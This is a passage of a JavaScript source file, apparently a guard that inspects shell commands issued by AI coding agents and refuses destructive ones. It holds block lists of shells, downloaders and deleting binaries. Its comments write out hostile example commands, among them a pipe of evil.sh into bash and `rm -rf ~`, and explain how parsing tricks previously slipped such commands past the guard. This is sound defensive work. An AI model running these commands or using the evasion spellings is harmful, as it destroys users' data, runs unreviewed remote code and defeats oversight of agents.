function stagedSecrets(dir, pathspecs = []) {
  if (typeof dir !== "string" || dir.length === 0) return null;
  const args = ["-C", dir, "status", "--porcelain", "--untracked-files=no"];
  if (pathspecs.length > 0) {
    const scoped = inRepoPathspecs(dir, pathspecs);
    // see untrackedSecrets — never widen to an unscoped probe
    if (scoped === null || scoped.length === 0) return [];
    args.push("--", ...scoped);
  }
  let out;
  try {
    out = execFileSync("git", args, {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"],
      timeout: 5000,
      maxBuffer: 16 * 1024 * 1024,
    });
  } catch {
    return null;
  }
  const hits = [];
  for (const line of out.split("\n")) {
    if (line.length < 4) continue;
    const indexCode = line[0];
    if (indexCode !== "A" && indexCode !== "R" && indexCode !== "C") continue;
    let p = line.slice(3).trim();
    const arrow = p.indexOf(" -> ");
    if (arrow !== -1) p = p.slice(arrow + 4); // rename/copy: the DESTINATION is what lands in the commit
    p = unquoteStatusPath(p);
    if (isSecretPath(p)) hits.push(p);
  }
  return hits;
}

/** True iff `p` is already tracked (or staged) in the repo at `dir`. Used only to EXEMPT a named
 *  path in CASE 1: a file git already carries is not something this guard can protect — it is
 *  already in history — and blocking edits to it would break ordinary work on legitimately tracked
 *  files (this repo tracks `.npmrc`, which is on the pattern list). Any failure returns false, i.e.
 *  toward blocking, which keeps CASE 1 strict. */
function isTrackedInRepo(dir, p) {
  if (typeof dir !== "string" || dir.length === 0) return false;
  try {
    execFileSync("git", ["-C", dir, "ls-files", "--error-unmatch", "--", p], {
      stdio: ["ignore", "ignore", "ignore"],
      timeout: 5000,
    });
    return true;
  } catch {
    return false;
  }
}

/** Does this segment change the working directory for everything after it? If so, the `cwd` from the
 *  hook payload no longer describes where a later `git` actually runs, and CASE 2 must stand down. */
function changesDirectory(tokens) {
  let i = 0;
  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
  const bin = (tokens[i] ?? "").split("/").pop();
  return bin === "cd" || bin === "pushd" || bin === "popd" || bin === "chdir";
}

// ──────────────────────────────────────────────────────────────────────────────────────────────
// DESTRUCTIVE-COMMAND GUARD
//
// Sparkle writes `permissions.defaultMode: "bypassPermissions"` into every managed agent worktree,
// because the per-command approval prompt was the fleet's biggest drag and it fired on COSMETIC
// triggers (a space in the worktree path, a `$(...)` substitution, a `>` redirect, an `&&`) rather
// than on danger. This guard is the other half of that trade: the brakes that make removing the
// prompt safe.
//
// It is the SECOND of two layers, and it exists because of what the first one cannot see. The deny
// rules Sparkle writes alongside the bypass (`permissions.deny`) are coarse and prefix-matched, so
// they never see inside a compound: `cd /tmp && rm -rf ~` is not a `rm` invocation to them. This
// guard lexes the command and checks every SEGMENT, so laundering a destructive command through a
// compound does not get it past.
//
// THE CONTRACT IS A FILE, NOT THIS SOURCE. `apps/desktop/shared/destructive-commands.json` holds a
// `mustBlock` corpus (every entry must be refused) and a `mustAllow` corpus (every entry must be
// permitted); `apps/desktop/src/guard/destructiveCommands.test.ts` drives both against this
// predicate, and `worktree.rs` asserts its own deny list against the same file. The two
// hand-written halves therefore fail together instead of drifting.
//
// `mustAllow` is the half that matters most. Every entry in it is a VERBATIM refusal an agent hit
// before this change — a guard that re-blocks one of them has rebuilt the wall we are tearing down,
// except now with no approval path through it. So the checks below are command-position anchored
// (never substring matches): `echo 'do not run: rm -rf /'` and `grep -rn 'push origin main' docs/`
// MENTION a denied command, and mentioning is not running.

/** Shells that turn piped bytes into executed code. */
const SHELL_BINARIES = new Set(["sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "csh", "tcsh"]);
/** Fetchers whose output, piped into one of the above, is unreviewed remote code execution. */
const DOWNLOADER_BINARIES = new Set(["curl", "wget"]);
/** Binaries that are destructive in every invocation an agent could have a reason to write.
 *  `diskutil` is deliberately NOT here: `diskutil list`/`info`/`apfs list` are read-only
 *  diagnostics, and blanket-blocking them would be the same over-blocking this guard exists to
 *  undo — worse, because a refusal has no approval path. Only its destructive verbs are denied. */
const ALWAYS_BLOCKED_BINARIES = new Set(["sudo", "shutdown", "reboot", "halt"]);
/** `diskutil` subcommands that destroy data. `apfs` takes a further verb, hence the second set.
 *  Compared lowercased because diskutil's verbs are case-insensitive (`diskutil ERASEDISK` resolves
 *  to eraseDisk), and read AFTER an optional literal `quiet` — its synopsis is
 *  `diskutil [quiet] verb [subVerb] [options]`, so `diskutil quiet eraseDisk …` is the same command. */
const DISKUTIL_DESTRUCTIVE = new Set([
  "erasedisk", "erasevolume", "partitiondisk", "reformat", "zerodisk", "randomdisk",
  "secureerase", "eraseoptical",
]);
const DISKUTIL_APFS_DESTRUCTIVE = new Set(["delete", "deletecontainer", "deletevolume", "erasevolume"]);
/** Package managers whose `publish` subcommand pushes to a public registry. */
const PUBLISHERS = new Set(["npm", "pnpm", "yarn"]);
/** The default branch, in both spellings. AGENTS.md: a PR is the gate; never write to it directly. */
const DEFAULT_BRANCHES = new Set(["main", "master"]);
/** System directories no agent has a reason to remove recursively, at ANY depth. */
const SYSTEM_ROOTS = [
  "/etc", "/system", "/usr", "/bin", "/sbin", "/var", "/library", "/applications",
  "/opt", "/dev", "/cores", "/private/etc", "/private/var",
];
/** Roots under which the FIRST path component is somebody's home directory. */
const HOME_CONTAINERS = ["/users", "/home", "/volumes"];

/** The command word of one lexed segment, plus its arguments — skipping leading `VAR=value` env
 *  assignments and any path prefix, exactly like `gitInvocation`. `bar/foo` invokes `foo`; a word
 *  that merely CONTAINS the name (`insecurity`, `security-scan`) is a different command entirely. */
function segmentCommand(tokens) {
  let i = 0;
  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
  if (i >= tokens.length) return null;
  return { bin: tokens[i].split("/").pop(), args: tokens.slice(i + 1) };
}

/** The arguments that are not options, in order — the subcommand and its operands. Bare `-`/`--`
 *  and anything starting with `-` is skipped, so `pnpm -r test` yields `["test"]`. */
function operandsOf(args) {
  // A bare `-` is an OPTION-ish word, not an operand — and the discrepancy between this line and
  // the docstring above it was a live bypass. `curl -fsSL https://evil.sh | bash -` is the
  // canonical stdin install line: `-` told `bash` to read the script from the pipe, but the old
  // filter (`a.length > 1`) kept it, so the pipe-to-shell rule saw a "file operand" and allowed
  // the whole thing. Code and contract now agree.
  return args.filter((a) => a !== "-" && a !== "--" && !(a.startsWith("-") && a.length > 1));
}

/** Operands that are not a real script on disk: the shell reads its program from stdin instead.
 *  These must never count as "a named script file is reviewable" for the pipe-to-shell rule. */
function isStdinOperand(a) {
  return a === "-" || a === "/dev/stdin" || /^\/dev\/fd\/\d+$/.test(a) || a === "/proc/self/fd/0";
}

/** The first argument that is not an option — a subcommand (`npm run`, `bd close`). */
function subcommandOf(args) {
  return operandsOf(args)[0] ?? null;
}

/** Is `p` a path whose recursive removal is catastrophic rather than ordinary cleanup?
 *
 *  The DEPTH RULE on home-rooted paths is the whole reason this is not a simple prefix list.
 *  Sparkle's own agent worktrees live at `$HOME/Library/Application Support/ai.sparkle.desktop/
 *  worktrees/<project>/<agent>`, so a blanket "under $HOME is catastrophic" would refuse
 *  `rm -rf <that worktree>/node_modules` — ordinary work, inside the agent's own lane, and exactly
 *  the kind of false refusal that gets a guard ripped out. So a home-rooted path is catastrophic
 *  only at the home directory itself or ONE level below it (`~`, `$HOME`, `$HOME/Projects`);
 *  anything deeper is the agent's own business. `$HOME` is not expanded by the lexer, so the
 *  literal token forms are matched directly. */
function isCatastrophicRoot(p) {
  if (typeof p !== "string" || p.length === 0) return false;
  // `rm -rf /*` and `rm -rf ~/` differ from their bare forms only in punctuation.
  let t = p.replace(/\/\*+$/, "").replace(/\/+$/, "");
  if (t === "" || t === "/") return true; // `/` survives the trailing-slash strip as ""
  // Home, named three ways: `~`, `$HOME`, `${HOME}`.
  const homeMatch = /^(~|\$HOME|\$\{HOME\})(\/|$)/.exec(t);
  if (homeMatch) {
    const rest = t.slice(homeMatch[0].length).replace(/^\/+/, "");
    return rest === "" || !rest.includes("/");
  }
  const lower = t.toLowerCase();
  for (const root of SYSTEM_ROOTS) {
    if (lower === root || lower.startsWith(root + "/")) return true;
  }
  // `/Users/alice` IS a home directory, so the same depth rule applies one component further in.
  for (const container of HOME_CONTAINERS) {
    if (lower === container) return true;
    if (lower.startsWith(container + "/")) {
      const rest = t.slice(container.length + 1);
      const parts = rest.split("/").filter(Boolean);
      return parts.length <= 2; // <container>/<user> and <container>/<user>/<one child>
    }
  }
  return false;
}

/** A root at DEPTH 0 — the filesystem root, a home directory itself, or a system root. Strictly
 *  narrower than [`isCatastrophicRoot`], which also covers one level below home (`$HOME/Projects`).
 *  That extra level is right for a direct `rm -rf`, whose argument IS the deletion target, and
 *  wrong for `find`, whose root is only where it starts looking. */
function isTopLevelRoot(p) {
  if (typeof p !== "string" || p.length === 0) return false;
  const t = p.replace(/\/\*+$/, "").replace(/\/+$/, "");
  if (t === "" || t === "/") return true;
  if (/^(~|\$HOME|\$\{HOME\})$/.test(t)) return true;
  const lower = t.toLowerCase();
  if (SYSTEM_ROOTS.includes(lower)) return true;
  for (const container of HOME_CONTAINERS) {
    if (lower === container) return true;
    // `/Users/alice` is a home directory; `/Users/alice/dev` is not.
    if (lower.startsWith(container + "/") && !t.slice(container.length + 1).includes("/")) return true;
  }
  return false;
}

/** `rm` with a recursive flag aimed at a catastrophic root. `rm -rf node_modules` is ordinary work
 *  and `rm -f /tmp/x` is not recursive at all — only the pairing of the two is denied. Flags may be
 *  bundled in any order (`-rf`, `-fr`) and `--` ends option parsing. */
function rmCatastrophicTarget(args) {
  if (!rmIsRecursive(args)) return null;
  return rmTargets(args).find(isCatastrophicRoot) ?? null;
}

/** Does this `rm` argument list carry a recursive flag, in any spelling or bundle order? */
function rmIsRecursive(args) {
  let endOfOpts = false;
  for (const a of args) {
    if (a === "--") { endOfOpts = true; continue; }
    if (endOfOpts) continue;
    if (a === "--recursive") return true;
    if (a.startsWith("--")) continue;
    if (a.startsWith("-") && a.length > 1 && /[rR]/.test(a.slice(1))) return true;
  }
  return false;
}

/** The non-option operands of an `rm` — the things it would actually delete. */
function rmTargets(args) {
  const targets = [];
  let endOfOpts = false;
  for (const a of args) {
    if (!endOfOpts && a === "--") { endOfOpts = true; continue; }
    if (!endOfOpts && a.startsWith("-") && a.length > 1) continue;
    targets.push(a);
  }
  return targets;
}

/** The destination branch of a push refspec: `HEAD:main` → `main`, `+refs/heads/main` → `main`. */
function pushDestination(refspec) {
  const dst = refspec.includes(":") ? refspec.slice(refspec.lastIndexOf(":") + 1) : refspec;
  return dst.replace(/^\+/, "").replace(/^refs\/heads\//, "");
}

/** `git push` that force-pushes or targets the default branch. `--force-with-lease` is the SAFE
 *  variant and is explicitly permitted; pushing your own agent branch is the normal path. */
function gitPushViolation(args) {
  let force = false;
  const positional = [];
  for (const a of args) {
    if (a === "--force-with-lease" || a.startsWith("--force-with-lease=") || a === "--force-if-includes") continue;
    if (a === "--force") { force = true; continue; }
    if (a.startsWith("--")) continue;
    if (a.startsWith("-") && a.length > 1) {
      if (a.slice(1).includes("f")) force = true;
      continue;
    }
    positional.push(a);
  }
  if (force) return "force-pushing rewrites history other agents and CI are building on";
  // positional[0] is the remote; every refspec after it names what is being written.
  for (const ref of positional.slice(1)) {
    if (DEFAULT_BRANCHES.has(pushDestination(ref))) {
      return "AGENTS.md: never write to the default branch directly — open a pull request instead";
    }
  }
  return null;
}

/** Wrapper flags that consume the NEXT word as their value. Without these the value is mistaken for
 *  the nested command word — `xargs -n 1 rm -rf ~` reads as the binary `1`, which matches no rule
 *  and is allowed. Same option-takes-a-value class as the `git clean -e` fix. */
const WRAPPER_VALUE_FLAGS = {
  // `-S` is BSD/macOS xargs's replsize and takes a value, exactly like GNU's lowercase `-s`. Its
  // absence let `xargs -S 5000 -I{} rm -rf {}` read the VALUE `5000` as the nested command word, so
  // a real `rm -rf` behind it resolved to a binary that matches no rule.
  xargs: new Set(["-I", "-i", "-n", "-L", "-l", "-P", "-s", "-S", "-a", "-d", "-E", "-e"]),
  nice: new Set(["-n"]),
  env: new Set(["-u", "-S", "-C"]),
  stdbuf: new Set(["-i", "-o", "-e"]),
  time: new Set(["-o", "-f"]),
  nohup: new Set([]),
};

/** The arguments from the first non-option word onward — i.e. a nested command line carried as
 *  operands (`xargs rm -rf ~`, `find . -exec rm -rf {} +`). Unlike `operandsOf` this keeps the
 *  nested command's OWN flags, which is the whole point: `rm`'s `-rf` must survive.
 *
 *  `valueFlags` names the wrapper's own options that swallow the following word, so that word is
 *  skipped rather than mistaken for the command. */
function commandTailFrom(args, valueFlags = new Set()) {
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === "--") continue;
    if (a.startsWith("-") && a.length > 1) {
      if (valueFlags.has(a)) i++; // skip this flag's value
      continue;
    }
    return args.slice(i);
  }
  return [];
}

/** The words EVERY `find … -exec/-execdir/-ok/-okdir <cmd> …` clause hands to a new process.
 *
 *  Two holes closed by returning all of them, and by reusing `FIND_COMMAND_PREDICATES` rather than
 *  re-listing the predicates here:
 *
 *  - `find` lets the predicate REPEAT, and reading only the first clause judged the harmless half of
 *    `find / -type f -exec echo {} \; -exec rm {} +` — one no-op clause in front hid the delete.
 *  - `-ok`/`-okdir` are `-exec`/`-execdir` with a per-file prompt, and the prompt is not a guard:
 *    `yes | find / -type f -ok rm {} \;` answers every one of them. The narrowing walk below already
 *    counted all four as command-carrying predicates; only this extractor disagreed, and a set that
 *    disagrees with its twin is exactly the drift the shared constant prevents. */
function findExecTails(args) {
  const out = [];
  for (let i = 0; i < args.length; i++) {
    if (!FIND_COMMAND_PREDICATES.has(args[i])) continue;
    const rest = args.slice(i + 1);
    const end = rest.findIndex((a) => a === ";" || a === "\\;" || a === "+");
    const tail = end === -1 ? rest : rest.slice(0, end);
    if (tail.length) out.push(tail);
    i = findSkipCommandRun(args, i) - 1; // step past this run so its words are never re-read
  }
  return out;
}

/** Every binary that DESTROYS the files `find` hands it.
 *
 *  This rule has been fixed one spelling at a time — `rm -r`, then plain `rm`, then `unlink` — because
 *  the predicate asked "is this the binary I happened to think of" instead of "does this destroy what
 *  it is given". `shred`/`srm` overwrite then unlink; `truncate` zeroes in place, which for the set
 *  find hands it is the same loss. Adding a spelling is now one edit here rather than a new clause at
 *  the call site.
 *
 *  `rmdir` is deliberately NOT here. It refuses non-empty directories and can never remove a file, so
 *  it destroys nothing that was not already empty — and including it hard-refused the canonical prune
 *  (`find ~ -type d -empty -exec rmdir {} +`), which neither `-empty` nor `-depth` narrows in this
 *  file's sense. Re-blocking safe work with no approval path is the failure mode this rule's own
 *  header warns about first, so the bar for joining this set is "destroys data", not "removes". */
const DELETING_BINARIES = new Set(["rm", "unlink", "shred", "srm", "truncate"]);

/** `env`'s command-carrying flag. `env -S 'rm {}'` RUNS `rm` — the string is a command line, not an
 *  opaque value — so treating `-S` as a value flag (which `WRAPPER_VALUE_FLAGS.env` does, correctly,
 *  for `-u`/`-C`) skips both words and hands back an empty tail. That reads as "nothing exec'd" and
 *  allows the very laundering the normalizer exists to catch.
 *
 *  Returns `{ str, rest }` — the command STRING and the operands that follow the flag, because
 *  `env -S 'sh -c' 'rm "$@"' _ {}` really runs `sh -c 'rm "$@"' _ {}`; re-lexing the string alone
 *  loses the `-c` argument and the deleter with it.
 *
 *  THE SCAN MUST BE BOUNDED to env's OWN option prefix. Scanning the whole vector let a `-S`-looking
 *  word belonging to the NESTED command hijack the parse — `env rm -rf -- -Sx {}` matched the `-Sx`
 *  operand of `rm`, so a real `rm -rf` at an unbounded root was reported as a non-deleter. That was
 *  a REGRESSION against the plain-wrapper path, which resolved the same tail to `rm` and blocked it.
 *  So: stop at `--`, and stop at the first word that is neither an option nor a `NAME=value`
 *  assignment (that word is the command). */
/** env's short options that take a VALUE (attached `-uNAME` or separate `-u NAME`). GNU contributes
 *  `u`/`C`/`a`(=--argv0)/`S`; BSD/macOS — the platform this guard actually runs on — adds `P altpath`
 *  and `L`/`U user`. A letter missing from here is walked as a boolean, so the `S` inside its
 *  attached value is read as `-S`: that is precisely the `-uSHELL` HIGH, and `-a`/`-P` reproduced it
 *  byte for byte. Booleans (`i`, `0`, `v`) must NOT be listed — see the arity warning below. */
const ENV_VALUE_SHORT = new Set(["u", "C", "a", "P", "L", "U"]);

/** Long options taking a REQUIRED argument: `--opt=V` or `--opt V`. */
const ENV_VALUE_LONG = ["--unset", "--chdir", "--argv0"];

/** Long options taking an OPTIONAL argument, which getopt_long only ever accepts ATTACHED
 *  (`--block-signal=SIG`). It never consumes a separate word, so treating these like the required
 *  set ate the nested command word — `env --block-signal rm -rf {}` resolved to the binary `{}` and
 *  allowed a real `rm -rf` over `/`. */
const ENV_OPTIONAL_LONG = ["--block-signal", "--ignore-signal", "--default-signal"];

/** ARITY MISTAKES CUT BOTH WAYS, and both ways end in ALLOW: fail to skip a real value and the value
 *  is read as the command word; skip a word that was not a value and the COMMAND is eaten. Five
 *  successive regressions on this rule were one or the other, each fixed by teaching the parser one
 *  more option spelling — and each time another spelling was already waiting.
 *
 *  So the parser no longer has to be RIGHT, only COMPLETE: every separate-word value is consumed AND
 *  its non-consuming reading is recorded as an alt, and every reading is judged. No word list is
 *  privileged and no reading is dropped. Safety comes from ADDITIVITY rather than from guessing the
 *  grammar — which matters because GNU and BSD env genuinely disagree about what the grammar is.
 */

/** Total `env` readings judged per top-level command, and the refusal for when it runs out.
 *
 *  A bound is needed: `alts` are SUFFIXES of one vector, and an alt's own command word can be `env`
 *  again, so nesting multiplies width while `MAX_NESTING` bounds only depth.
 *
 *  But the bound must FAIL CLOSED, and the first attempt did the exact opposite. It silently
 *  TRUNCATED the reading list, and because alts are recorded left to right the entries it dropped
 *  were the SHORTEST suffixes — the most plausible real commands. Seven no-op `-u` pads were then
 *  enough to push the one destructive reading off the end, so
 *  `env -u A ... -u G --unset sh -c 'rm -rf /'` was ALLOWED while the same command unpadded blocked.
 *  A cap an attacker can pad past is not a cap; exhausting this budget REFUSES instead. */
const ENV_READING_BUDGET = 512;
let envReadingsLeft = ENV_READING_BUDGET;
const ENV_BUDGET_VERDICT = {
  rule: "env",
  why: "too many option-arity readings to judge — refusing rather than guessing which one runs",
};

/** Distinct token lists, MOST SPECIFIC FIRST. Nothing is dropped: the shortest suffix is the
 *  likeliest real command so it is judged first, and the budget refuses rather than truncating. */
function envDedupeReadings(lists) {
  const seen = new Set();
  const out = [];
  for (const t of lists) {
    const k = t.join("\u0000"); // NUL cannot occur in argv, so it cannot collide
    if (seen.has(k)) continue;
    seen.add(k);
    out.push(t);
  }
  return out;
}

/** The token lists `env` ultimately runs — the ONE implementation both callers use.
 *
 *  This exists because a second, weaker reader is what caused the whole `env` saga: `commandTailFrom`
 *  matches value flags as exact tokens, and while `execTailDeleter` was taught the real option
 *  grammar, `judgeSegment` kept using the weak reader. So every spelling fixed for `find -exec`
 *  stayed ALLOW when `env` was the command word itself — `env -S 'rm -rf /'` among them, which is a
 *  plainer and more reachable spelling than any of the `find` ones. Two readers of one question, two
 *  answers, and the fixture suite could not see it because every `env` case was wrapped in `find`. */
function envRunTokenLists(args) {
  const parsed = envParse(args);
  const alts = parsed.alts ?? [];
  const ordered = [...alts].reverse(); // shortest suffix = likeliest real command
  if (parsed.kind === "tail") return envDedupeReadings([parsed.tail, ...ordered]);
  const segs = lexCommand(stripHeredocBodies(parsed.str));
  if (segs.length === 0) return envDedupeReadings([parsed.rest, ...ordered]);
  // Operands after the flag continue the LAST segment of the split string.
  return envDedupeReadings([
    ...segs.map((s, k) => (k === segs.length - 1 ? [...s, ...parsed.rest] : s)),
    ...ordered,
  ]);
}

/** Parse `env`'s OWN option prefix and say what it ultimately runs. Either:
 *    `{ kind: "split", str, rest }` — `env -S '<command line>' [operands]`
 *    `{ kind: "tail", tail }`       — the nested command's own words
 *
 *  Returning the tail here (rather than falling back to the generic `commandTailFrom`) is what makes
 *  the two shapes agree. `commandTailFrom` matches value-taking flags as EXACT TOKENS, so it cannot
 *  skip a bundled or attached value — and every value it fails to skip is then read as the nested
 *  command word, which reports a real `rm` as some harmless binary.
 *
 *  The cluster is walked LETTER BY LETTER for the same reason. Searching for an `S` anywhere in the
 *  word matched the `S` inside an ATTACHED value: `env -uSHELL rm -rf {}` parsed as the command
 *  `HELL rm -rf {}`, so a real `rm -rf` at an unbounded root came back a non-deleter. That shipped —
 *  it is the third regression of this exact class on this rule, each one an option-parsing shortcut
 *  that happened to match something belonging to the nested command. Hence: consume `-u`/`-C`'s value
 *  (rest of the word, else the next word) and stop reading that word as options. */
function envParse(args) {
  // Every separate word we SKIP as an option value is also a candidate command word, and `alts`
  // records that reading so both can be judged. GNU and BSD env do not agree on the option set —
  // BSD has no `--unset` at all (`usage: env [-0iv] [-C workdir] [-P utilpath] [-S string]`), and
  // measured on macOS, `env --unset sh -c '…'` really does execute `sh -c '…'`. One grammar cannot
  // be right for both platforms, so ambiguity is made ADDITIVE rather than guessed: judge each
  // reading and refuse if any is destructive. That cannot over-refuse in practice, because the
  // alternative reading of a genuine value (`env -u NODE_OPTIONS pnpm test` → `NODE_OPTIONS …`)
  // has a command word that matches no rule.
  const alts = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === "--") return { kind: "tail", tail: args.slice(i + 1), alts };
    if (!a.startsWith("-") || a === "-") {
      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) continue; // NAME=value is still env's own
      return { kind: "tail", tail: args.slice(i), alts }; // the command word
    }
    if (a.startsWith("--")) {
      // getopt_long takes `--opt=value`, `--opt value`, and unambiguous abbreviations.
      const eq = a.indexOf("=");
      const name = eq === -1 ? a : a.slice(0, eq);
      if (name.length > 2 && "--split-string".startsWith(name)) {
        return eq === -1
          ? { kind: "split", str: args[i + 1] ?? "", rest: args.slice(i + 2), alts }
          : { kind: "split", str: a.slice(eq + 1), rest: args.slice(i + 1), alts };
      }
      // Optional-argument options are matched FIRST and consume nothing: `--block-signal` never
      // takes a separate word, so falling through to the required set would eat the command.
      if (eq === -1 && name.length > 2 && ENV_OPTIONAL_LONG.some((o) => o.startsWith(name))) continue;
      if (eq === -1 && name.length > 2 && ENV_VALUE_LONG.some((o) => o.startsWith(name))) {
        alts.push(args.slice(i + 1)); // the reading where this option takes NO separate value
        i++;
      }
      continue;
    }
    let valueIsNextWord = false;
    for (let k = 1; k < a.length; k++) {
      const c = a[k];
      if (c === "S") {
        const after = a.slice(k + 1);
        return after.length
          ? { kind: "split", str: after, rest: args.slice(i + 1), alts }
          : { kind: "split", str: args[i + 1] ?? "", rest: args.slice(i + 2), alts };
      }
      if (ENV_VALUE_SHORT.has(c)) {
        // Whatever follows in this word is this option's VALUE, not more option letters. If the
        // word ends here the value is the next word — consumed unconditionally, with the
        // non-consuming reading recorded as an alt just below, so neither reading is privileged.
        valueIsNextWord = k + 1 >= a.length;
        break;
      }
      // otherwise an ordinary boolean option letter (`-i`, `-v`, `-0`) — keep walking the cluster
    }
    if (valueIsNextWord) {
      alts.push(args.slice(i + 1)); // the reading where this option takes NO separate value
      i++;
    }
  }
  return { kind: "tail", tail: [], alts };
}

/** The deleting binary an exec tail ultimately runs, or null.
 *
 *  Reading the tail's FIRST word is not enough, and that is the same "one word over" reasoning that
 *  added `unlink`: the identical deletion is spelled through a wrapper (`env rm`, `nice rm`,
 *  `stdbuf -o0 rm`) or through a shell (`sh -c 'rm "$@"'`), and both leave the command word as
 *  something no binary list will ever contain. Enumerating names is only sound once the tail is
 *  NORMALIZED, so resolve the wrapper chain and the shell's `-c` string first — reusing the
 *  machinery this file already applies to `xargs` and to top-level shell segments. */
function execTailDeleter(tail, depth = 0) {
  if (depth > MAX_NESTING) return null;
  let seg = segmentCommand(tail);
  // `env nice rm` is two wrappers deep, so unwrap in a loop rather than once.
  for (let i = 0; seg && NESTING_WRAPPERS.has(seg.bin) && i < MAX_NESTING; i++) {
    // `env -S '…'` carries a COMMAND LINE, so it is re-lexed like a shell's `-c` rather than
    // unwrapped like an operand tail — the generic unwrap treats `-S` as taking an opaque value
    // and returns an empty tail, which reads as "nothing was exec'd" and allows the laundering.
    if (seg.bin === "env") {
      for (const toks of envRunTokenLists(seg.args)) {
        if (envReadingsLeft-- <= 0) return "rm"; // budget exhausted: refuse, never fall through
        const inner = execTailDeleter(toks, depth + 1);
        if (inner) return inner;
      }
      return null;
    }
    seg = segmentCommand(commandTailFrom(seg.args, WRAPPER_VALUE_FLAGS[seg.bin]));
  }
  if (!seg) return null;
  if (DELETING_BINARIES.has(seg.bin)) return seg.bin;
  if (SHELL_BINARIES.has(seg.bin)) {
    // Same bundled-flag search as the top-level shell rule (`-lc`, `-ec`, …), not an exact `-c`.
    const at = seg.args.findIndex((a) => a.startsWith("-") && !a.startsWith("--") && a.includes("c"));
    if (at !== -1 && seg.args[at + 1] !== undefined) {
      for (const toks of lexCommand(stripHeredocBodies(seg.args[at + 1]))) {
        const inner = execTailDeleter(toks, depth + 1);
        if (inner) return inner;
      }
    }
  }
  return null;
}

/** find's own options that precede the paths (`find -L $HOME …`), and the one that takes a value. */
const FIND_LEADING_FLAGS = new Set(["-H", "-L", "-P", "-E", "-X", "-d", "-s", "-x"]);

/** `find`'s path operands — everything before the first PREDICATE (`-name`, `-exec`, …).
 *
 *  Breaking at the first `-` was wrong: find's own options come BEFORE the paths, so
 *  `find -L $HOME -exec rm -rf {} +` produced an empty root list and slipped the rule below. */
function findSearchRoots(args) {
  const out = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    // `-f <path>`: the VALUE is a root, so collect it. Skipping both words (which `i++; continue`
    // did, because the loop's own `i++` also fires) made `find -f / -delete` produce an empty root
    // list — the very bug this function was rewritten to fix, reintroduced two lines below it.
    if (a === "-f") {
      if (args[i + 1] !== undefined) out.push(args[++i]);
      continue;
    }
    if (FIND_LEADING_FLAGS.has(a)) continue;
    if (a.startsWith("-")) break; // a predicate — paths are done
    out.push(a);
  }
  return out;
}

/** Does this `find` narrow what it matches to something the author NAMED?
 *
 *  Only target-naming predicates count. `-type`, `-size`, `-mtime`, `-perm` and friends are
 *  filters, not names: `find $HOME -type f -delete` deletes every regular file under home, which is
 *  worse than the case this rule was written for, and treating `-type` as "narrowing" disabled the
 *  rule entirely for it. A name that matches everything (`*`, `.*`) is not a name either. */
const NAMING_PREDICATES = new Set([
  "-name", "-iname", "-path", "-ipath", "-regex", "-iregex", "-lname", "-samefile",
]);
/** Does this GLOB pattern actually name something, or is it wildcards all the way down?
 *
 *  A literal set (`*`, `.*`, …) was too small by construction: `-path '/*'` and `-regex '.+'` bound
 *  nothing either and were not in it. The question is not "is this one of five strings" but "does
 *  it contain any literal to match against" — so a pattern made only of glob metacharacters,
 *  separators and quantifiers names everything, i.e. nothing.
 *
 *  A glob's `*` is a SEPARATE token from what precedes it, so `x*` genuinely anchors the prefix `x`
 *  and an "is there a literal anywhere" test is the right question here. That is exactly what makes
 *  it the wrong question for a regex — see below.
 *
 *  A CHARACTER CLASS is full of alphanumerics and names nothing: `find / -name '[a-z]*' -delete`
 *  matches every path beginning with a letter, which is the same hole this rule closes for `'*'`
 *  and `'/*'`, just spelled differently. So classes come out before the literal test — and so do
 *  escapes, since `\d`/`\w` are metacharacters wearing a letter. A class that sits BESIDE a real
 *  literal (`log[0-9]`) still narrows: only the class is removed, not the pattern. */
function globNamesSomething(pattern) {
  return /[A-Za-z0-9_]/.test(stripBracketClasses(pattern.replace(/\\./g, "")));
}

/** Index of the `]` that CLOSES the bracket expression opened at `open`, or -1 if unterminated.
 *
 *  ONE implementation, used by the glob path and the regex path, because they had drifted: a regex
 *  `\[[^\]]*\]` cannot express this rule, and POSIX fnmatch (what `-name`/`-path` use, GNU and BSD
 *  alike) and BRE/ERE all agree on it — a `]` in the FIRST position, after an optional `!`/`^`, is a
 *  literal MEMBER of the class, not the terminator. So `[]a-z]` is one class matching `]` or a
 *  letter, while the naive regex closes at that first `]` and leaves `a-z]` behind as apparent
 *  literal text — which then counts as a name and re-opens the very bypass the strip closes,
 *  spelled with one extra character.
 *
 *  TWO constructs hold a `]` that does not close the class, and both are supported by fnmatch and by
 *  BRE/emacs alike. The second is the POSIX sub-expressions `[:class:]`, `[.coll.]` and `[=equiv=]`,
 *  whose own `]` ends the sub-expression rather than the class:
 *
 *      find / -name '[[:alpha:]x]*' -delete       ← closing at `:alpha:]` leaves `x]*`, so `x`
 *      find / -iregex '[[:alnum:]x]*.*' -delete     counted as a name and this was ALLOWED
 *
 *  Note what made that hard to see: the leak needs a member AFTER the sub-expression. `[[:alpha:]]*`
 *  strips down to non-alnum residue either way and stays blocked, so a corpus built from the obvious
 *  spelling reads as covering the construct while the `x` variant walks through. */
function bracketClassEnd(pattern, open) {
  let i = open + 1;
  if (pattern[i] === "!" || pattern[i] === "^") i++;
  if (pattern[i] === "]") i++; // a leading `]` is a member, not the close
  while (i < pattern.length) {
    const sub = pattern[i] === "[" ? pattern[i + 1] : undefined;
    if (sub === ":" || sub === "." || sub === "=") {
      const end = pattern.indexOf(sub + "]", i + 2);
      // An UNTERMINATED sub-expression is not a sub-expression: fnmatch (glibc explicitly, BSD by
      // the same reading) rewinds and treats the `[` as an ordinary MEMBER of the class. Returning
      // -1 here instead looked like refusing, and was — but only on the regex path. On the glob path
      // -1 means "this `[` never closes, so it is a literal `[`", so `stripBracketClasses` kept the
      // `[`, resumed one character in, found a SHORTER class, stripped that, and left the real
      // class's earlier members behind as apparent literal text:
      //
      //     find / -name '[a-z[:]*' -delete      ← residue `[a-z*` → `a` counted → ALLOWED,
      //     find / -name '[a[:alpha]*' -delete     and BLOCKED before the sub-expression change
      //
      // Two readers of one sentinel, disagreeing about its meaning — the same shape as the two
      // readers of a bracket class that `bracketClassEnd` was extracted to prevent.
